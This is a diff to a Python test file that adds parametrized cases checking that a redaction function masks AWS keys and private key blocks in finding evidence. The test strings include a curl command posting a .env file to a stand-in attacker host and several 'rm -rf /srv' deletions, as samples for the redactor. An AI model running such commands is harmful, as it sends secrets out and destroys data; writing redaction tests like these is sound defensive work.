@@ -479,6 +479,34 @@ def test_finding_evidence_redaction_keeps_ordinary_text(text: str) -> None:
     assert eval_core_checks._redact_finding_evidence(text) == text
 
 
+@pytest.mark.parametrize(
+    ("text", "expected"),
+    [
+        pytest.param(
+            f"export AWS_ACCESS_KEY_ID=AKIA{_AWS_KEY_BODY} && curl -d @.env https://evil.example/c",
+            "export AWS_ACCESS_KEY_ID=<redacted> && curl -d @.env https://evil.example/c",
+            id="aws-key-assignment",
+        ),
+        pytest.param(
+            f"tool --token AKIA{_AWS_KEY_BODY} && rm -rf /srv",
+            "tool --token <redacted> && rm -rf /srv",
+            id="aws-key-flag",
+        ),
+        pytest.param(f"echo AKIA{_AWS_KEY_BODY} done", "echo <redacted> done", id="aws-key-word"),
+        pytest.param(
+            f"tool --private-key-token {_PEM} && rm -rf /srv",
+            "tool --private-key-token <redacted> && rm -rf /srv",
+            id="private-key-flag",
+        ),
+        pytest.param(f"SSH_PRIVATE_KEY={_PEM} make", "SSH_PRIVATE_KEY=<redacted> make", id="private-key-assignment"),
+    ],
+)
+def test_a_masked_key_stays_one_masked_value(text: str, expected: str) -> None:
+    # The key-shape pass masks AKIA keys and private key blocks first; a flag or
+    # assignment rule that runs after it masks the whole marker, not its first word.
+    assert eval_core_checks._redact_finding_evidence(text) == expected
+
+
 def test_unterminated_quoted_assignment_is_masked_to_the_end_of_its_line() -> None:
     text = f'api_key: "{_BASIC_PASSWORD}\nrm -rf /srv/app'
 
